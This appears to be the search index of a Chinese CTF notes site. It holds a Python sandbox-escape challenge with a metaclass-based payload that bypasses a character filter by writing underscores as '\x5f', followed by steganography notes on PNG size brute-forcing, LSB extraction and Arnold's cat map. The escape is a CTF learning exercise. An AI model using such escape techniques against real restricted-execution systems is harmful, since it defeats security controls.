'max' : max , 'min' : min , 'next' : next , 'oct' : oct , 'ord' : ord , 'pow' : pow , 'print' : print , 'range' : range , 'reversed' : reversed , 'round' : round , 'set' : set , 'slice' : slice , 'sorted' : sorted , 'str' : str , 'sum' : sum , 'tuple' : tuple , 'type' : type , 'vars' : secure_vars , 'zip' : zip , '__builtins__' : None } def createMethod ( code ): # if len(code) > 45: # print('Too long!! Bad Guy!!') # return for x in ' _$#@~' : code = code . replace ( x , '' ) def wrapper ( self ): exec ( code , safe_dict , { 'self' : self }) return wrapper def setName ( pattern ): while True : name = input ( f 'Give me your { pattern } name :' ) if ( name . isalpha ()): break else : print ( 'Illegal Name...' ) return name def setAttribute ( cls ): attrName = setName ( 'attribute' ) while True : attrValue = input ( f 'Give me your value:' ) if ( attrValue . isalnum ()): break else : print ( 'Illegal value...' ) setattr ( cls , attrName , attrValue ) def setMethod ( cls ): methodName = setName ( 'method' ) code = input ( f 'Give me your function:' ) func = createMethod ( code ) setattr ( cls , methodName , func ) def getAttribute ( obj ): attrs = [ attr for attr in dir ( obj ) if not callable ( getattr ( obj , attr )) and not attr . startswith ( \"__\" )] x = input ( 'Please enter the attribute \\' s name :' ) if x not in attrs : print ( f 'You can \\' t access the attribute { x } ' ) return else : try : print ( f ' { x } : { getattr ( obj , x ) } ' ) except : print ( \"Something went wrong in your attribute...\" ) return def callMethod ( cls , obj ): attrs = [ attr for attr in dir ( obj ) if callable ( getattr ( obj , attr )) and not attr . startswith ( \"__\" )] x = input ( 'Please enter the method \\' s name :' ) if x not in attrs : print ( f 'You can \\' t access the method { x } ' ) return else : # try: print ( f 'calling method { x } ...' ) cls . __dict__ [ x ]( obj ) print ( 'done' ) # except: # print('Something went wrong in your method...') # return class Guest ( metaclass = BalsnMetaClass ): pass if __name__ == '__main__' : print ( f 'Welcome!!We have prepared a class named \"Guest\" for you' ) cnt = 0 while cnt < 3 : cnt += 1 print ( '1. Add attribute' ) print ( '2. Add method' ) print ( '3. Finish' ) x = input ( \"Option ? :\" ) if x == \"1\" : setAttribute ( Guest ) elif x == \"2\" : setMethod ( Guest ) elif x == \"3\" : break else : print ( \"invalid input.\" ) cnt -= 1 print ( \"Well Done! We Create an instance for you !\" ) obj = Guest () cnt = 0 while cnt < 3 : cnt += 1 print ( '1. Inspect attribute' ) print ( '2. Using method' ) print ( '3. Exit' ) x = input ( \"Option ? :\" ) if x == \"1\" : getAttribute ( obj ) elif x == \"2\" : callMethod ( Guest , obj ) elif x == \"3\" : print ( \"Okay...exit...\" ) break else : print ( \"invalid input.\" ) cnt -= 1 \u4e3b\u8981\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a MasterMetaClass \u7684\u5b9e\u4f8b\u4f46\u4e0d\u8c03\u7528\u5b83\u7684 __init__\u3002\u5e76\u4e14 method method \u9650\u5236\u4e86\u957f\u5ea6 <=45\uff0c\u800c\u4e14 ' \uff08\u7a7a\u683c\uff09_$#@~ ' \u90fd\u4f1a\u88ab\u5220\u6389\uff0c\u5185\u90e8 exec \u7684 globals \u4e5f\u7ed9\u4e86\u9650\u5236 \u76f4\u63a5\u8c03\u7528 MasterMetaClass \u6765\u5b9e\u4f8b\u5316\u4f1a\u6267\u884c __call__ \u548c __init__\uff0c\u76f4\u63a5\u8c03\u7528 __new__ \u53c8\u4f1a\u88ab\u9650\u5236\u4e0d\u80fd\u8f93\u5165\u4e0b\u5212\u7ebf \u521b\u5efa\u4e00\u4e2a\u5143\u7c7b\u53ef\u4ee5\u4f7f\u7528 type(name, bases, dict) \uff0c\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7c7b\uff0c\u53c2\u6570\u662f\uff1a name : It is a string which basically represents the name of the class . bases : It is a tuple that specifies the base classes of the main class . dict : It is a \u2018 dictionary \u2018 that is used to create body of the class specified. \u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 type \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 metaclass\uff0c\u8ba9\u5b83\u57fa\u4e8e\uff08\u4e5f\u5c31\u662f bases \u53c2\u6570\u5185\u5bb9\uff09MasterMetaClass\uff0c\u5e76\u4e14\u8986\u76d6\u6389\u5b83\u7684 __init__\uff0c\u6240\u4ee5\u6700\u7ec8\u7684 payload \u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u6539\u5199\uff1a type ( \"\" , ( MasterMetaClass ,), { \"__init__\" : print })( \"\" ,(),{}) . IWantGETFLAGPlz ( 1 ) \u56e0\u4e3a\u8fd9\u65f6\u7684\u4e0b\u5212\u7ebf\u5728\u5f15\u53f7\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 \"\\x5f\" \u6765\u4ee3\u66ff payload add method x : e = \" \\x5f \" * 2 ; self . d = { e + \"init\" + e : print } add method y : self . m = type ( '' ,( MasterMetaClass ,), self . d ) add method z : self . m ( '' ,(),{}) . IWantGETFLAGPlz ( 1 ) call x call y call z","title":"metaclass"},{"location":"ctf/escapes/pysandbox/#reference","text":"TokyoWesterns CTF 4th 2018 Writeup \u2014 Part 5 Documentation of ast \u4e00\u6587\u770b\u61c2Python\u6c99\u7bb1\u9003\u9038 - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237 https://blog.gztime.cc/posts/2021/83a30666/","title":"Reference"},{"location":"ctf/steg/","text":"\u9690\u5199\u672f \u00b6 Steganography is the practice of concealing a message within another message or a physical object. In computing/electronic contexts, a computer file, message, image, or video is concealed within another file, message, image, or video. \u2014\u2014\u2014\u2014 Wikipedia Abstract \u9690\u5199\u662f CTF \u4e2d misc \u7c7b\u9898\u76ee\u6bd4\u8f83\u5e38\u51fa\u7684\u7c7b\u578b\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u5c31\u662f\u8981\u7834\u89e3\u9690\u5199\u7684\u65b9\u6cd5\uff0c\u5f97\u5230\u88ab\u9690\u5199\u7684\u5185\u5bb9\uff08flag\uff09 \u56fe\u7247\u3001\u97f3\u9891\u3001\u89c6\u9891\u7b49\u5a92\u4f53\u6587\u4ef6\u90fd\u53ef\u80fd\u7528\u6765\u9690\u5199\uff0c\u8303\u56f4\u5e7f\u6837\u5f0f\u591a Table of Contents \u00b6 \u56fe\u7247\u9690\u5199 \u97f3\u9891\u9690\u5199","title":"\u9690\u5199\u672f"},{"location":"ctf/steg/#_1","text":"Steganography is the practice of concealing a message within another message or a physical object. In computing/electronic contexts, a computer file, message, image, or video is concealed within another file, message, image, or video. \u2014\u2014\u2014\u2014 Wikipedia Abstract \u9690\u5199\u662f CTF \u4e2d misc \u7c7b\u9898\u76ee\u6bd4\u8f83\u5e38\u51fa\u7684\u7c7b\u578b\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u5c31\u662f\u8981\u7834\u89e3\u9690\u5199\u7684\u65b9\u6cd5\uff0c\u5f97\u5230\u88ab\u9690\u5199\u7684\u5185\u5bb9\uff08flag\uff09 \u56fe\u7247\u3001\u97f3\u9891\u3001\u89c6\u9891\u7b49\u5a92\u4f53\u6587\u4ef6\u90fd\u53ef\u80fd\u7528\u6765\u9690\u5199\uff0c\u8303\u56f4\u5e7f\u6837\u5f0f\u591a","title":"\u9690\u5199\u672f"},{"location":"ctf/steg/#table-of-contents","text":"\u56fe\u7247\u9690\u5199 \u97f3\u9891\u9690\u5199","title":"Table of Contents"},{"location":"ctf/steg/audio/","text":"\u97f3\u9891\u9690\u5199 \u00b6 \u770b\u6ce2\u5f62/\u9891\u8c31 mp3stego \u8f6f\u4ef6\u9690\u5199 SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\uff0c\u4f7f\u7528 Robot36 \u7b49\u624b\u673a\u8f6f\u4ef6\u8bc6\u522b","title":"\u97f3\u9891\u9690\u5199"},{"location":"ctf/steg/audio/#_1","text":"\u770b\u6ce2\u5f62/\u9891\u8c31 mp3stego \u8f6f\u4ef6\u9690\u5199 SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\uff0c\u4f7f\u7528 Robot36 \u7b49\u624b\u673a\u8f6f\u4ef6\u8bc6\u522b","title":"\u97f3\u9891\u9690\u5199"},{"location":"ctf/steg/image/","text":"\u56fe\u7247\u9690\u5199 \u00b6 \u9690\u85cf\u6587\u4ef6 \u00b6 \u56fe\u7247\u4e00\u822c\u53ea\u8bfb\u53d6\u5230\u9700\u8981\u7684\u5927\u5c0f\u5c31\u505c\u6b62\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u5176\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u540e\u9762\u63d2\u5165\u5176\u4ed6\u6587\u4ef6 \u8fd9\u65f6\u76f4\u63a5\u4f7f\u7528 binwalk foremost \u7b49\u5de5\u5177\u5c31\u53ef\u4ee5\u53d1\u73b0\u3001\u63d0\u53d6 png \u6539\u53d8\u5927\u5c0f \u00b6 png \u7684\u6587\u4ef6\u5934\u8bb0\u5f55\u4e86\u56fe\u7247\u7684\u5927\u5c0f\uff0c\u8d85\u8fc7\u5927\u5c0f\u7684\u6570\u636e\u5c06\u4e0d\u4f1a\u51fa\u73b0\u5728\u56fe\u7247\u91cc \u5982\u679c\u662f\u5229\u7528\u8fd9\u4e2a\u65b9\u5f0f\u8fdb\u884c\u9690\u5199\u7684\u53ef\u4ee5\u76f4\u63a5\u66f4\u6539 png \u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u6570\u636e\u6765\u6539\u53d8\u5927\u5c0f\u770b\u5230\u9690\u85cf\u7684\u5185\u5bb9 png \u6587\u4ef6\u5934\u683c\u5f0f \u00b6 \uff08 8 bytes\uff09png \u6587\u4ef6\u5934\u6807\u8bc6\uff1a 89 50 4E 47 0D 0A 1A 0A \uff08 4 bytes\uff09IHDR \u6570\u636e\u5757\u957f\u5ea6 13: 00 00 00 0D \uff08 4 bytes\uff09IHDR \u5757\u6807\u8bc6\uff1a 49 48 44 52 \uff0813 bytes\uff09IHDR \u5757\uff1a \uff084 bytes\uff09\u5bbd\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5927\u7aef\u5e8f \uff084 bytes\uff09\u9ad8\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5927\u7aef\u5e8f \uff085 bytes\uff09bit depth\u3001color type\u3001compression method\u3001filter method\u3001interlace method \uff08 4 bytes\uff09crc \u6821\u9a8c\u7801\uff0c\u4ece IHDR \u6807\u8bc6\u5230\u5757\u7ed3\u675f\u603b\u5171 17 bytes \u7684 crc \u6821\u9a8c\u7801 \u7206\u7834\u5927\u5c0f \u00b6 import struct import binascii img = open ( \"....png\" , \"rb\" ) . read () height , width = 0 , 0 for i in range ( ... ): for j in range ( ... ): data = img [ 12 : 16 ] + struct . pack ( '>i' , i ) + struct . pack ( '>i' , j ) + img [ 24 : 29 ] crc32 = binascii . crc32 ( data ) & 0xffffffff if crc32 == 0 x ........ : height = i width = j print ( 'hex:' , hex ( i ), hex ( j )) new_img = list ( img ) new_img [ 16 : 20 ] = struct . pack ( '>i' , height ) new_img [ 20 : 24 ] = struct . pack ( '>i' , width ) with open ( 'out.png' , 'wb' ) as f : f . write ( bytes ( new_img )) LSB \u9690\u5199 \u00b6 LSB\uff08Least Significant Bit\uff09\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u9690\u5199\u65b9\u6cd5\u3002\u56e0\u4e3a\u4eba\u773c\u5bf9\u989c\u8272\u7684\u5206\u8fa8\u6709\u9650\u5ea6\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539\u56fe\u7247\u7684\u6bcf\u4e2a\u50cf\u7d20\u70b9\u7684\u989c\u8272\u6bd4\u7279\u7684\u6700\u4f4e\u4f4d\u6765\u9690\u85cf\u4fe1\u606f\uff0c\u4f46\u4e0d\u88ab\u4eba\u773c\u5206\u8fa8\u51fa\u6765 \u8fd9\u79cd\u9898\u76ee\u4e00\u822c\u53ef\u4ee5\u4f7f\u7528 stegsolve \u8f6f\u4ef6\u6765\u5b8c\u6210\uff0c\u6709\u4e24\u79cd\u60c5\u51b5\uff1a \u6700\u4f4e\u4f4d\u63d0\u53d6\u51fa\u6765\u4f5c\u4e3a\u7070\u5ea6\u662f\u4e00\u5f20\u56fe\u7247\uff1a\u76f4\u63a5\u5728 stegsolve \u4e2d\u6253\u5f00\u7136\u540e\u53f3\u7bad\u5934\u7ffb\u627e\u5c31\u53ef\u4ee5 \u6700\u4f4e\u4f4d\u9690\u85cf\u4e86\u4e8c\u8fdb\u5236\u4fe1\u606f\uff1astegsolve \u6253\u5f00\uff0cAnalyze -> Data Extract \u9488\u5bf9\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528 PIL \u5e93\u6765\u5b8c\u6210\uff1a from PIL import Image img = Image . open ( \"...\" ) width , height = img . size img2 = Image . new ( \"L\" , img . size ) for i in range ( width ): for j in range ( height ): R , G , B , A = pix = img . getpixel (( i , j )) # C, M, Y, K = pix = img.getpixel((i,j)) # Y, Cb, Cr = pix = img.getpixel((i, j)) if R & 0b1 == 0 : img2 . putpixel (( i , j ), 0 ) else : img2 . putpixel (( i , j ), 255 ) img2 . show () \u5728 mac \u4e0a\uff0cstegsolve data extract \u4f1a\u51fa\u73b0 UI \u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177 zsteg \u66ff\u4ee3\uff1a zsteg image.png b1,lsb -a -v # \u663e\u793a\u6240\u6709 bgr \u987a\u5e8f\u4e0b\u7684\u6700\u4f4e\u4f4d lsb zsteg -E '1b,bgr,lsb' image.png # \u786e\u5b9a bgr \u987a\u5e8f\u540e\u63d0\u53d6\u5341\u516d\u8fdb\u5236\u503c \u8272\u5f69\u6a21\u5f0f \u00b6 \u4f46\u6709\u65f6\u539f\u6587\u4ef6\u7684 lsb \u770b\u4e0d\u5230\u6216\u8005\u4e0d\u6e05\u695a\uff0c\u8003\u8651\u662f\u8f6c\u6362\u4e86\u8272\u5f69\u683c\u5f0f \u56e0\u4e3a lsb \u7684\u539f\u7406\u662f\u63d0\u53d6\u89c6\u89c9\u5f71\u54cd\u5f31\u7684\u4f4e\u4f4d\uff0c\u6240\u4ee5\u8981\u6c42\u8f6c\u6362\u5fc5\u987b\u5b8c\u5168\u7cbe\u51c6\uff0c\u4e00\u822c\u90fd\u91c7\u7528 PIL \u6216\u8005 cv2 \u5e93\u4e2d\u7684\u5185\u7f6e\u65b9\u6cd5\u8f6c\u6362\uff08\u56e0\u4e3a\u8fd0\u7b97\u65b9\u6cd5\u786e\u5b9a\uff09\uff0c\u800c\u4e0d\u4f7f\u7528 Ps \u7b49\u8f6f\u4ef6\u6765\u8f6c\u6362\u8272\u5f69\u6a21\u5f0f\uff08\u8fc7\u4e8e\u590d\u6742\uff0c\u4e0d\u6613\u64cd\u63a7\uff0c\u4f1a\u635f\u5931\u4f4e\u4f4d\u6570\u636e\uff09 PIL.Image \u4e2d\u652f\u6301 11 \u79cd\u56fe\u7247\u6a21\u5f0f\uff1a1\u3001L\u3001P\u3001RGB\u3001RGBA\u3001CMYK\u3001YCbCr\u3001LAB\u3001HSV\u3001I\u3001F https://pillow.readthedocs.io/en/stable/handbook/concepts.html#concept-modes 1 \u9ed1\u767d\u4e8c\u503c\uff08\u4f46\u662f\u662f0\u548c255\uff09 L \u7070\u5ea6\uff08I\u4e5f\u662f\u7070\u5ea6\uff0c\u4f46L\u662f8bit\u5b58\u50a8\uff0cI\u662f32bit\u5b58\u50a8 RGB \u8f6c L \uff1a L = R * 299/1000 + G * 587/1000+ B * 114/1000 P 8bit\u8272\u503c RGB\u548cCMYK\u8f6c\u6362\u65f6\u6709\u8272\u5dee\uff0c\u56e0\u4e3a\u8f6c\u6362\u7684\u516c\u5f0f\u662f\uff1a C = 255 - R M = 255 - G Y = 255 - B K = 0 \u4e5f\u56e0\u6b64\u5728LSB\u9690\u5199\u65f6\u8fd9\u4e24\u79cd\u6a21\u5f0f\u6ca1\u6709\u5dee\u522b \u4f46\u662f RGB \u548c YCbCr\u3001LAB\u3001HSV \u4e4b\u95f4\u590d\u6742\u7684\u8f6c\u6362\u65f6\u5c31\u6709\u4e86\u5dee\u522b\uff0c\u4f7f\u7528\u65f6\u76f4\u63a5 .convert(\"mode\") \u5373\u53ef\u3002\u4e00\u4e9b PIL \u4e0d\u652f\u6301\u7684\u8f6c\u6362\u4e5f\u53ef\u4ee5\u4f7f\u7528 cv2 Arnold's cat map \u00b6 Arnold's cat map \u662f\u4e00\u79cd\u7b97\u6cd5\uff0c\u6765\u6253\u4e71\u50cf\u7d20\u70b9\uff0c\u5e76\u4e14\u5728\u4e00\u5b9a\u6b21\u6570\u540e\u4f1a\u6062\u590d\u539f\u6837 https://en.wikipedia.org/wiki/Arnold%27s_cat_map import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , keep_all = False , name = \"arnold_cat- {name} - {index} .png\" ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 2 * x + 1 * y ) % width # <- \u8fd9\u91cc\u53c2\u6570\u53ef\u4ee5\u8c03 ny = ( 1 * x + 1 * y ) % height # <- \u8fd9\u91cc\u53c2\u6570\u53ef\u4ee5\u8c03 canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) if counter > 0 and not keep_all : os . remove ( path ) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( \"...\" , ... ) result . show () \u9690\u5199\u5de5\u5177 \u00b6 \u6709\u4e9b\u56fe\u7247\u9690\u5199\u662f\u5229\u7528\u67d0\u4e9b\u8f6f\u4ef6\u6765\u9690\u85cf\u7684\u6570\u636e\uff0c\u8fd9\u79cd\u4e00\u822c\u90fd\u9700\u8981\u5bc6\u7801\u6765\u89e3\u5bc6\uff0c\u5e38\u89c1\u7684\u6709\uff1a steghide\uff1a http://steghide.sourceforge.net/ SilentEye\uff1a https://achorein.github.io/silenteye/","title":"\u56fe\u7247\u9690\u5199"},{"location":"ctf/steg/image/#_1","text":"","title":"\u56fe\u7247\u9690\u5199"},{"location":"ctf/steg/image/#_2","text":"\u56fe\u7247\u4e00\u822c\u53ea\u8bfb\u53d6\u5230\u9700\u8981\u7684\u5927\u5c0f\u5c31\u505c\u6b62\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u5176\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u540e\u9762\u63d2\u5165\u5176\u4ed6\u6587\u4ef6 \u8fd9\u65f6\u76f4\u63a5\u4f7f\u7528 binwalk foremost \u7b49\u5de5\u5177\u5c31\u53ef\u4ee5\u53d1\u73b0\u3001\u63d0\u53d6","title":"\u9690\u85cf\u6587\u4ef6"},{"location":"ctf/steg/image/#png","text":"png \u7684\u6587\u4ef6\u5934\u8bb0\u5f55\u4e86\u56fe\u7247\u7684\u5927\u5c0f\uff0c\u8d85\u8fc7\u5927\u5c0f\u7684\u6570\u636e\u5c06\u4e0d\u4f1a\u51fa\u73b0\u5728\u56fe\u7247\u91cc \u5982\u679c\u662f\u5229\u7528\u8fd9\u4e2a\u65b9\u5f0f\u8fdb\u884c\u9690\u5199\u7684\u53ef\u4ee5\u76f4\u63a5\u66f4\u6539 png \u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u6570\u636e\u6765\u6539\u53d8\u5927\u5c0f\u770b\u5230\u9690\u85cf\u7684\u5185\u5bb9","title":"png \u6539\u53d8\u5927\u5c0f"},{"location":"ctf/steg/image/#png_1","text":"\uff08 8 bytes\uff09png \u6587\u4ef6\u5934\u6807\u8bc6\uff1a 89 50 4E 47 0D 0A 1A 0A \uff08 4 bytes\uff09IHDR \u6570\u636e\u5757\u957f\u5ea6 13: 00 00 00 0D \uff08 4 bytes\uff09IHDR \u5757\u6807\u8bc6\uff1a 49 48 44 52 \uff0813 bytes\uff09IHDR \u5757\uff1a \uff084 bytes\uff09\u5bbd\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5927\u7aef\u5e8f \uff084 bytes\uff09\u9ad8\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5927\u7aef\u5e8f \uff085 bytes\uff09bit depth\u3001color type\u3001compression method\u3001filter method\u3001interlace method \uff08 4 bytes\uff09crc \u6821\u9a8c\u7801\uff0c\u4ece IHDR \u6807\u8bc6\u5230\u5757\u7ed3\u675f\u603b\u5171 17 bytes \u7684 crc \u6821\u9a8c\u7801","title":"png \u6587\u4ef6\u5934\u683c\u5f0f"},{"location":"ctf/steg/image/#_3","text":"import struct import binascii img = open ( \"....png\" , \"rb\" ) . read () height , width = 0 , 0 for i in range ( ... ): for j in range ( ... ): data = img [ 12 : 16 ] + struct . pack ( '>i' , i ) + struct . pack ( '>i' , j ) + img [ 24 : 29 ] crc32 = binascii . crc32 ( data ) & 0xffffffff if crc32 == 0 x ........ : height = i width = j print ( 'hex:' , hex ( i ), hex ( j )) new_img = list ( img ) new_img [ 16 : 20 ] = struct . pack ( '>i' , height ) new_img [ 20 : 24 ] = struct . pack ( '>i' , width ) with open ( 'out.png' , 'wb' ) as f : f . write ( bytes ( new_img ))","title":"\u7206\u7834\u5927\u5c0f"},{"location":"ctf/steg/image/#lsb","text":"LSB\uff08Least Significant Bit\uff09\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u9690\u5199\u65b9\u6cd5\u3002\u56e0\u4e3a\u4eba\u773c\u5bf9\u989c\u8272\u7684\u5206\u8fa8\u6709\u9650\u5ea6\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539\u56fe\u7247\u7684\u6bcf\u4e2a\u50cf\u7d20\u70b9\u7684\u989c\u8272\u6bd4\u7279\u7684\u6700\u4f4e\u4f4d\u6765\u9690\u85cf\u4fe1\u606f\uff0c\u4f46\u4e0d\u88ab\u4eba\u773c\u5206\u8fa8\u51fa\u6765 \u8fd9\u79cd\u9898\u76ee\u4e00\u822c\u53ef\u4ee5\u4f7f\u7528 stegsolve \u8f6f\u4ef6\u6765\u5b8c\u6210\uff0c\u6709\u4e24\u79cd\u60c5\u51b5\uff1a \u6700\u4f4e\u4f4d\u63d0\u53d6\u51fa\u6765\u4f5c\u4e3a\u7070\u5ea6\u662f\u4e00\u5f20\u56fe\u7247\uff1a\u76f4\u63a5\u5728 stegsolve \u4e2d\u6253\u5f00\u7136\u540e\u53f3\u7bad\u5934\u7ffb\u627e\u5c31\u53ef\u4ee5 \u6700\u4f4e\u4f4d\u9690\u85cf\u4e86\u4e8c\u8fdb\u5236\u4fe1\u606f\uff1astegsolve \u6253\u5f00\uff0cAnalyze -> Data Extract \u9488\u5bf9\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528 PIL \u5e93\u6765\u5b8c\u6210\uff1a from PIL import Image img = Image . open ( \"...\" ) width , height = img . size img2 = Image . new ( \"L\" , img . size ) for i in range ( width ): for j in range ( height ): R , G , B , A = pix = img . getpixel (( i , j )) # C, M, Y, K = pix = img.getpixel((i,j)) # Y, Cb, Cr = pix = img.getpixel((i, j)) if R & 0b1 == 0 : img2 . putpixel (( i , j ), 0 ) else : img2 . putpixel (( i , j ), 255 ) img2 . show () \u5728 mac \u4e0a\uff0cstegsolve data extract \u4f1a\u51fa\u73b0 UI \u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177 zsteg \u66ff\u4ee3\uff1a zsteg image.png b1,lsb -a -v # \u663e\u793a\u6240\u6709 bgr \u987a\u5e8f\u4e0b\u7684\u6700\u4f4e\u4f4d lsb zsteg -E '1b,bgr,lsb' image.png # \u786e\u5b9a bgr \u987a\u5e8f\u540e\u63d0\u53d6\u5341\u516d\u8fdb\u5236\u503c","title":"LSB \u9690\u5199"},{"location":"ctf/steg/image/#_4","text":"\u4f46\u6709\u65f6\u539f\u6587\u4ef6\u7684 lsb \u770b\u4e0d\u5230\u6216\u8005\u4e0d\u6e05\u695a\uff0c\u8003\u8651\u662f\u8f6c\u6362\u4e86\u8272\u5f69\u683c\u5f0f \u56e0\u4e3a lsb \u7684\u539f\u7406\u662f\u63d0\u53d6\u89c6\u89c9\u5f71\u54cd\u5f31\u7684\u4f4e\u4f4d\uff0c\u6240\u4ee5\u8981\u6c42\u8f6c\u6362\u5fc5\u987b\u5b8c\u5168\u7cbe\u51c6\uff0c\u4e00\u822c\u90fd\u91c7\u7528 PIL \u6216\u8005 cv2 \u5e93\u4e2d\u7684\u5185\u7f6e\u65b9\u6cd5\u8f6c\u6362\uff08\u56e0\u4e3a\u8fd0\u7b97\u65b9\u6cd5\u786e\u5b9a\uff09\uff0c\u800c\u4e0d\u4f7f\u7528 Ps \u7b49\u8f6f\u4ef6\u6765\u8f6c\u6362\u8272\u5f69\u6a21\u5f0f\uff08\u8fc7\u4e8e\u590d\u6742\uff0c\u4e0d\u6613\u64cd\u63a7\uff0c\u4f1a\u635f\u5931\u4f4e\u4f4d\u6570\u636e\uff09 PIL.Image \u4e2d\u652f\u6301 11 \u79cd\u56fe\u7247\u6a21\u5f0f\uff1a1\u3001L\u3001P\u3001RGB\u3001RGBA\u3001CMYK\u3001YCbCr\u3001LAB\u3001HSV\u3001I\u3001F https://pillow.readthedocs.io/en/stable/handbook/concepts.html#concept-modes 1 \u9ed1\u767d\u4e8c\u503c\uff08\u4f46\u662f\u662f0\u548c255\uff09 L \u7070\u5ea6\uff08I\u4e5f\u662f\u7070\u5ea6\uff0c\u4f46L\u662f8bit\u5b58\u50a8\uff0cI\u662f32bit\u5b58\u50a8 RGB \u8f6c L \uff1a L = R * 299/1000 + G * 587/1000+ B * 114/1000 P 8bit\u8272\u503c RGB\u548cCMYK\u8f6c\u6362\u65f6\u6709\u8272\u5dee\uff0c\u56e0\u4e3a\u8f6c\u6362\u7684\u516c\u5f0f\u662f\uff1a C = 255 - R M = 255 - G Y = 255 - B K = 0 \u4e5f\u56e0\u6b64\u5728LSB\u9690\u5199\u65f6\u8fd9\u4e24\u79cd\u6a21\u5f0f\u6ca1\u6709\u5dee\u522b \u4f46\u662f RGB \u548c YCbCr\u3001LAB\u3001HSV \u4e4b\u95f4\u590d\u6742\u7684\u8f6c\u6362\u65f6\u5c31\u6709\u4e86\u5dee\u522b\uff0c\u4f7f\u7528\u65f6\u76f4\u63a5 .convert(\"mode\") \u5373\u53ef\u3002\u4e00\u4e9b PIL \u4e0d\u652f\u6301\u7684\u8f6c\u6362\u4e5f\u53ef\u4ee5\u4f7f\u7528 cv2","title":"\u8272\u5f69\u6a21\u5f0f"},{"location":"ctf/steg/image/#arnolds-cat-map","text":"Arnold's cat map \u662f\u4e00\u79cd\u7b97\u6cd5\uff0c\u6765\u6253\u4e71\u50cf\u7d20\u70b9\uff0c\u5e76\u4e14\u5728\u4e00\u5b9a\u6b21\u6570\u540e\u4f1a\u6062\u590d\u539f\u6837 https://en.wikipedia.org/wiki/Arnold%27s_cat_map import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , keep_all = False , name = \"arnold_cat- {name} - {index} .png\" ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 2 * x + 1 * y ) % width # <- \u8fd9\u91cc\u53c2\u6570\u53ef\u4ee5\u8c03 ny = ( 1 * x + 1 * y ) % height # <- \u8fd9\u91cc\u53c2\u6570\u53ef\u4ee5\u8c03 canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) if counter > 0 and not keep_all : os . remove ( path ) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( \"...\" , ... ) result . show ()","title":"Arnold's cat map"},{"location":"ctf/steg/image/#_5","text":"\u6709\u4e9b\u56fe\u7247\u9690\u5199\u662f\u5229\u7528\u67d0\u4e9b\u8f6f\u4ef6\u6765\u9690\u85cf\u7684\u6570\u636e\uff0c\u8fd9\u79cd\u4e00\u822c\u90fd\u9700\u8981\u5bc6\u7801\u6765\u89e3\u5bc6\uff0c\u5e38\u89c1\u7684\u6709\uff1a steghide\uff1a http://steghide.sourceforge.net/ SilentEye\uff1a https://achorein.github.io/silenteye/","title":"\u9690\u5199\u5de5\u5177"},{"location":"hpc/","text":"\u9ad8\u6027\u80fd\u8ba1\u7b97 \u00b6 Abstract \u5927\u4e00\u6691\u5047\u5c0f\u5b66\u671f\u9009\u4e86\u8d85\u7b97\u961f\u7684\u8bfe\uff0c\u611f\u53d7\u611f\u53d7\u3001\u73a9\u4e00\u73a9\uff0c\u4e0d\u6e05\u695a\u4e4b\u540e\u4f1a\u4e0d\u4f1a\u7ee7\u7eed\u641e Table of Contents \u00b6 HPC 101 \u8d85\u7b97\u5c0f\u5b66\u671f \u5411\u91cf\u5316\u8ba1\u7b97","title":"\u9ad8\u6027\u80fd\u8ba1\u7b97"},{"location":"hpc/#_1","text":"Abstract 